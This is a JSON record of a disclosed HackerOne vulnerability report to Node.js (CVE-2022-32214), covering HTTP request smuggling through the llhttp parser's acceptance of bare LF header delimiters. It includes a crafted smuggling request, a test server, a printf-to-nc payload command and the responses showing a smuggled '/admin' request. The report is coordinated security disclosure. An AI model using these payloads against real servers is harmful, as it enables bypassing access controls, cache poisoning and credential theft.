{
  "id": 1524692,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTI0Njky",
  "url": "https://hackerone.com/reports/1524692",
  "title": "HTTP Request Smuggling Due To Improper Delimiting of Header Fields",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2022-03-28T16:07:44.994Z",
  "submitted_at": "2022-03-28T16:07:45.081Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "zeyu2001",
    "url": "/zeyu2001",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/q2hu1zvae85i18uspc1vkbpxwdbq/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1?response-content-disposition=inline%3B%20filename%3D%22icon.png%22%3B%20filename%2A%3DUTF-8%27%27icon.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWOFFUOGP%2F20250920%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250920T231744Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHwaCXVzLXdlc3QtMiJIMEYCIQCO8e98CG93gx6FI93avcVk93orGMThgwEg%2BxhAiYwrXgIhAMah1DU4HhGxSu5S4LbJ3j6IyULGaP4hFSPFJv2WNr2JKrsFCPT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzev0Pr%2F5UlW%2FL7fPYqjwXWJoLjlkU8GWlAViMQ3u%2FjvH9y3yiMa5dU8xk%2BCsIybMAVwkKy%2FBzn%2FowkGS27NxJfn4Get3qq07Iq%2FfxvVifPXry2iqo0%2BtesEWRNnYEoDy1WXB8NP3nSK1RdZ4C%2BDEjFUfiGdVtbebkEzw1ifv0o%2B6sJRawWSgazfGXh6pEjgcIH%2FComPwS%2BpJweMpmQOzZomMfh4hSjUQcFSMNWjn4RVMFIAwBOLe54KdqfWPrfIQWxngSoN%2Bmsgp55TAiS7yHoghkgQ5ZL8wi5V%2Fj3jOZnpcQs7ceV%2F4JinpFzHxdHrZGqHTTBNuGs2CX%2F6tynSVMQ8lldsKCjREPSVnNx6RB0GF92bYT6wxggCqxCPziGaT3Q8Ch24afG6ztAt%2BxbY3rAeNbBeE4s35EGKSWYA6GrLs8G35CZsg3wblIuvx4JdnAF14owRU27QTNGY869dHq1kTev8mlUwq%2FH6%2BK981EmupY7zkmfxeQtJ9T%2BfpFoOogHERfTb%2FlF0Y3xr5ikBgMkSZoAOHl%2BXIJgEv5DM7p1t9Ml3jLA%2Bp2mc0HOAF0EUmgI6x80Kc0eRN4BpKrb5JMw2XcyTG%2FlADP9Ojq2o2mnHdHhmMQdKo%2BfnD6XyX32lVj0POdfQerAYK1vjIKF1COpZnmyJTy4mlRM1TIhd3LL8%2F5mWZu4hMFbOJ4ZeN4%2FyIOQ1S3Gdw4hHQiyoXQnJqZbqrmQ%2F%2Brg5q94emnWgheoPI5UBfqjKv0HWzSpyLAR6ED%2BQipJTzHhFkDifRCM8f%2FfMKrMQ7xNsAHNf%2FL%2F3ZM1c23%2F3ENsujqGsRLhXc3uGGWBQZkmwiMqXOvn4POKiMpj%2BquxFhFjrppowZ7a0DYCsGBHS4PX5T8Zryd4PbyjMOv7u8YGOrABYECv1ysrusYXz8v1PffKu2oS9%2FWTV3wfmfM994qCLjqBjzayF%2BG46FDMOHWKiyMXvtqUS%2FSnsTAiz5nWitLq1BHR5WmrwcvldH2z%2BI5FyrT9%2B49ixOsFaHdDn%2FwdS2GSJqanubFedGASA6T%2FEoZ78mFlMM4QbCwrlIwr0DtRZMTOJVWMyadjBPUIPVz3rimScaaqXJhy5htKpLL3HXszy1hHTdkrWLjXMtW7vgtkBO0%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f1afc29641e81ff00d2b5483f14df600b1eb8c58456bd1050bfb7d814135ac26"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 22984,
    "url": "https://hackerone.com/nodejs",
    "handle": "nodejs",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Node.js",
      "twitter_handle": "nodejs",
      "website": "https://nodejs.org",
      "about": "The Node.js JavaScript Runtime"
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2022-32214"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2022-07-07T17:26:47.529Z",
  "bug_reporter_agreed_on_going_public_at": "2022-07-07T17:26:47.462Z",
  "team_member_agreed_on_going_public_at": "2022-07-07T16:59:30.077Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "**Summary:**\n\nThe `llhttp` parser in the `http` module in Node v17.8.0 does not strictly use the CRLF sequence to delimit HTTP requests. This can lead to HTTP Request Smuggling (HRS).\n\n**Description:**\n\nThe LF character (without CR) is sufficient to delimit HTTP header fields in the `lihttp` parser. According to [RFC7230 section 3](https://datatracker.ietf.org/doc/html/rfc7230#section-3), only the CRLF sequence should delimit each `header-field`.\n\nConsider the following request (all lines are delimited by CRLF except the `[\\n]` part)\n\n```http\nGET / HTTP/1.1\nHost: localhost\nDummy: x[\\n]Content-Length: 23\n\nGET / HTTP/1.1\nDummy: GET /admin HTTP/1.1\nHost: localhost\n\n```\n\nSuppose that an upstream server:\n- Correctly delimits lines by the CRLF sequence instead of only LF\n- Incorrectly allows the LF character in header values\n\nThis leads to HTTP request smuggling as the Node server sees one extra header field, `Content-Length: 23` while the upstream proxy thinks that the content length of the first request is 0.\n\nRequest as seen by the Node server:\n\n```http\nGET / HTTP/1.1\nHost: localhost\nDummy: x\nContent-Length: 23\n\nGET / HTTP/1.1\nDummy: GET /admin HTTP/1.1\nHost: localhost\n\n```\n\n## Steps To Reproduce:\n\nServer code I used for testing:\n\n```javascript\nconst http = require('http');\n\nhttp.createServer((request, response) => {\n   let body = [];\n   request.on('error', (err) => {\n      response.end(\"error while reading body: \" + err)\n   }).on('data', (chunk) => {\n      body.push(chunk);\n   }).on('end', () => {\n   body = Buffer.concat(body).toString();\n   \n   response.on('error', (err) => {\n      response.end(\"error while sending response: \" + err)\n   });\n\n   response.end(JSON.stringify({\n         \"URL\": request.url,\n         \"Headers\": request.headers,\n         \"Length\": body.length,\n         \"Body\": body,\n      }) + \"\\n\");\n   });\n}).listen(80);\n```\n\nPayload:\n\n```bash\n(printf \"GET / HTTP/1.1\\r\\n\"\\\n\"Host: localhost\\r\\n\"\\\n\"Dummy: x\\nContent-Length: 23\\r\\n\"\\\n\"\\r\\n\"\\\n\"GET / HTTP/1.1\\r\\n\"\\\n\"Dummy: GET /admin HTTP/1.1\\r\\n\"\\\n\"Host: localhost\\r\\n\"\\\n\"\\r\\n\"\\\n\"\\r\\n\") | nc localhost 80\n```\n\n**Expected result:** Sees two requests, both to `/`.\n\n**Actual result:** Sees one request to `/` and another to `/admin`.\n\n```http\nHTTP/1.1 200 OK\nDate: Mon, 28 Mar 2022 15:51:44 GMT\nConnection: keep-alive\nKeep-Alive: timeout=5\nContent-Length: 124\n\n{\"URL\":\"/\",\"Headers\":{\"host\":\"localhost\",\"dummy\":\"x\",\"content-length\":\"23\"},\"Length\":23,\"Body\":\"GET / HTTP/1.1\\r\\nDummy: \"}\nHTTP/1.1 200 OK\nDate: Mon, 28 Mar 2022 15:51:44 GMT\nConnection: keep-alive\nKeep-Alive: timeout=5\nContent-Length: 69\n\n{\"URL\":\"/admin\",\"Headers\":{\"host\":\"localhost\"},\"Length\":0,\"Body\":\"\"}\n```\n\n## Impact\n\nDepending on the specific web application, HRS can lead to cache poisoning, bypassing of security layers, stealing of credentials and so on.",
  "weakness": {
    "id": 86,
    "name": "HTTP Request Smuggling"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2022-08-06T16:59:30.179Z",
  "allow_singular_disclosure_after": -98605093.87482028,
  "singular_disclosure_allowed": true,
  "vote_count": 9,
  "voters": [
    "zeyu2001",
    "zy9ard3",
    "red_darkin",
    "f1ras",
    "shivammusic",
    "aasim690",
    "jpalayoor",
    "ming_",
    "hacktronresearch"
  ],
  "severity": {
    "rating": "medium",
    "score": 6.5,
    "author_type": "User",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "low",
      "integrity": "low",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 666,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/nodejs/node",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
